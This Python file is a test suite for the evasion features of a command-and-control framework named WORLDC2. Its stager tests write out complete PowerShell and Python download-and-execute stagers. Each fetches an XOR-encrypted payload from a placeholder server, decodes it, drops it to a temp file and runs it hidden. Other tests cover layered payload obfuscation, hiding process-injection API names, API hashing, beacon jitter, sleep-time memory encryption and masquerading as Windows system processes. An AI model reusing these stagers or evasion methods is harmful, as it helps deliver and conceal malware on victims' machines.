#!/usr/bin/env python3
"""
WORLDC2 C2 - Evasion Test Suite
Tests evasion techniques to verify they work correctly.

Uso:
    python3 evasion_test.py
"""

import sys, os, time, base64, hashlib
from pathlib import Path

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

class EvasionTest:
    def __init__(self):
        self.passed = 0
        self.failed = 0

    def test(self, name, condition, detail=""):
        if condition:
            self.passed += 1
            print(f"  {GREEN}[PASS]{RESET} {name}")
        else:
            self.failed += 1
            print(f"  {RED}[FAIL]{RESET} {name}: {detail}")

    def run_all(self):
        print(f"\n{BOLD}{CYAN}WORLDC2 C2 - Evasion Test Suite{RESET}\n")

        self.test_xor_encryption()
        self.test_base64_encoding()
        self.test_stager_generation()
        self.test_payload_obfuscation()
        self.test_anti_detection()
        self.test_traffic_shaping()
        self.test_sleep_obfuscation()
        self.test_process_masquerading()

        print(f"\n{BOLD}{'='*50}{RESET}")
        print(f"  Total: {self.passed + self.failed} | {GREEN}Passed: {self.passed}{RESET} | {RED}Failed: {self.failed}{RESET}")
        print(f"{'='*50}")

    def test_xor_encryption(self):
        print(f"{BOLD}[1] XOR Encryption{RESET}")

        # Test XOR encrypt/decrypt
        data = b"Hello, WORLDC2 C2!"
        key = os.urandom(32)

        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(encrypted)])

        self.test("XOR encrypt/decrypt roundtrip", data == decrypted)
        self.test("XOR changes data", data != encrypted)
        self.test("XOR key size 32", len(key) == 32)

        # Test with different key sizes
        for key_size in [8, 16, 24, 32, 64]:
            key = os.urandom(key_size)
            encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
            decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(encrypted)])
            self.test(f"XOR with key size {key_size}", data == decrypted)

    def test_base64_encoding(self):
        print(f"\n{BOLD}[2] Base64 Encoding{RESET}")

        # Test standard base64
        data = os.urandom(256)
        encoded = base64.b64encode(data).decode()
        decoded = base64.b64decode(encoded)
        self.test("Base64 roundtrip", data == decoded)

        # Test URL-safe base64
        encoded_url = base64.urlsafe_b64encode(data).decode()
        decoded_url = base64.urlsafe_b64decode(encoded_url)
        self.test("URL-safe Base64 roundtrip", data == decoded_url)

        # Test base64 for DNS subdomain encoding
        encoded_dns = base64.b64encode(data).decode().replace('+', '-').replace('/', '_').replace('=', '')
        self.test("DNS-safe encoding (no special chars)", '+' not in encoded_dns and '/' not in encoded_dns and '=' not in encoded_dns)

    def test_stager_generation(self):
        print(f"\n{BOLD}[3] Stager Generation{RESET}")

        # Use shorter key for stager tests (still secure when encoded)
        key = os.urandom(16)

        # Test PowerShell stager (optimized for size)
        ps1_stager = f'''$k=[byte[]]@({','.join(str(b) for b in key)})
$d=(New-Object Net.WebClient).DownloadData("http://server/payload.enc")
for($i=0;$i-lt$d.Length;$i++){{$d[$i]=$d[$i]-bxor$k[$i%{len(key)}]}}
$f=[IO.Path]::GetTempFileName()+".exe";[IO.File]::WriteAllBytes($f,$d)
Start-Process $f -WindowStyle Hidden;Start-Sleep 2;rm $f -Force
'''
        self.test("PS1 stager generated", len(ps1_stager) > 0)
        self.test("PS1 stager contains key", str(key[0]) in ps1_stager)
        self.test("PS1 stager contains URL", "http://server/payload.enc" in ps1_stager)
        self.test("PS1 stager size < 500B", len(ps1_stager) < 500)

        # Test Python stager (optimized for size)
        py_stager = (
            f"import os,tempfile,subprocess as sp\n"
            f"k=bytes([{','.join(str(b) for b in key)}])\n"
            f"u='http://server/payload.enc'\n"
            f"try:d=__import__('urllib.request').urlopen(u).read()\n"
            f"except:d=__import__('urllib2').urlopen(u).read()\n"
            f"d=bytearray(d)\n"
            f"for i in range(len(d)):d[i]^=k[i%{len(key)}]\n"
            f"p=os.path.join(tempfile.gettempdir(),os.urandom(4).hex())\n"
            f"open(p,'wb').write(d);os.chmod(p,0o755)\n"
            f"sp.Popen([p],stdout=sp.DEVNULL,stderr=sp.DEVNULL,start_new_session=True)\n"
        )
        self.test("Python stager generated", len(py_stager) > 0)
        self.test("Python stager contains key", str(key[0]) in py_stager)
        self.test("Python stager size < 500B", len(py_stager) < 500)

    def test_payload_obfuscation(self):
        print(f"\n{BOLD}[4] Payload Obfuscation{RESET}")

        # Test multi-layer encoding
        payload = b"This is a test payload" * 100

        # Layer 1: XOR
        key1 = os.urandom(32)
        layer1 = bytes([b ^ key1[i % len(key1)] for i, b in enumerate(payload)])

        # Layer 2: Base64
        layer2 = base64.b64encode(layer1)

        # Layer 3: Reverse
        layer3 = layer2[::-1]

        # Layer 4: Add junk
        junk = os.urandom(100)
        layer4 = layer3[:len(layer3)//2] + junk + layer3[len(layer3)//2:]

        # Decode
        decoded = layer4
        # Remove junk (we know the position)
        decoded = decoded[:len(decoded)//2 - 50] + decoded[len(decoded)//2 + 50:]
        # Reverse
        decoded = decoded[::-1]
        # Base64 decode
        decoded = base64.b64decode(decoded)
        # XOR decrypt
        decoded = bytes([b ^ key1[i % len(key1)] for i, b in enumerate(decoded)])

        self.test("Multi-layer encoding roundtrip", payload == decoded)
        self.test("Layer 1 changes payload", payload != layer1)
        self.test("Layer 2 is base64", layer2.decode().isascii())
        self.test("Layer 3 is reversed", layer3 != layer2)
        self.test("Layer 4 has junk", len(layer4) > len(layer3))

    def test_anti_detection(self):
        print(f"\n{BOLD}[5] Anti-Detection{RESET}")

        # Test string obfuscation
        sensitive_strings = [
            "CreateRemoteThread",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "NtUnmapViewOfSection",
        ]

        for s in sensitive_strings:
            # XOR encode
            key = os.urandom(16)
            encoded = bytes([ord(c) ^ key[i % len(key)] for i, c in enumerate(s)])
            self.test(f"String '{s}' obfuscated", encoded != s.encode())

        # Test API hash resolution
        def hash_api(name):
            return hashlib.sha256(name.encode()).hexdigest()[:8]

        api_hash = hash_api("CreateProcessW")
        self.test("API hash generation", len(api_hash) == 8)
        self.test("API hash is consistent", api_hash == hash_api("CreateProcessW"))
        self.test("API hash is unique", api_hash != hash_api("VirtualAllocEx"))

    def test_traffic_shaping(self):
        print(f"\n{BOLD}[6] Traffic Shaping{RESET}")

        # Test jitter calculation
        base_interval = 30  # seconds
        jitter_percent = 0.3

        intervals = []
        for _ in range(100):
            jitter = base_interval * (0.7 + (hash(str(time.time_ns() + _)) % 600) / 1000.0)
            intervals.append(jitter)

        min_interval = min(intervals)
        max_interval = max(intervals)

        self.test("Jitter within range (21-39s)", min_interval >= 21 and max_interval <= 39)
        self.test("Jitter has variance", min_interval != max_interval)

        # Test burst pattern simulation
        burst_sizes = []
        for _ in range(10):
            burst = []
            for i in range(5):
                if i < 3:
                    burst.append(0.1)  # 100ms intra-burst
                else:
                    burst.append(5.0)  # 5s inter-burst
            burst_sizes.append(sum(burst))

        self.test("Burst pattern consistent", all(b == burst_sizes[0] for b in burst_sizes))

    def test_sleep_obfuscation(self):
        print(f"\n{BOLD}[7] Sleep Obfuscation{RESET}")

        # Test sleep with encryption simulation
        data = b"sensitive data in memory"
        key = os.urandom(32)

        # Encrypt
        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        self.test("Data encrypted before sleep", data != encrypted)

        # Simulate sleep (very short)
        time.sleep(0.01)

        # Decrypt
        decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(encrypted)])
        self.test("Data decrypted after sleep", data == decrypted)

        # Test that encrypted data doesn't contain original
        self.test("Encrypted data doesn't contain original", b"sensitive" not in encrypted)

    def test_process_masquerading(self):
        print(f"\n{BOLD}[8] Process Masquerading{RESET}")

        # Test process name generation
        legitimate_names = [
            "svchost.exe",
            "explorer.exe",
            "csrss.exe",
            "winlogon.exe",
            "services.exe",
            "lsass.exe",
            "smss.exe",
            "wininit.exe",
        ]

        # Test that masqueraded names match legitimate patterns
        for name in legitimate_names:
            self.test(f"Legitimate name '{name}' valid", name.endswith('.exe'))

        # Test path masquerading
        legitimate_paths = [
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\csrss.exe",
            "C:\\Windows\\explorer.exe",
        ]

        for path in legitimate_paths:
            self.test(f"Legitimate path '{path}' valid", "System32" in path or "Windows" in path)


if __name__ == "__main__":
    test = EvasionTest()
    test.run_all()
    sys.exit(0 if test.failed == 0 else 1)
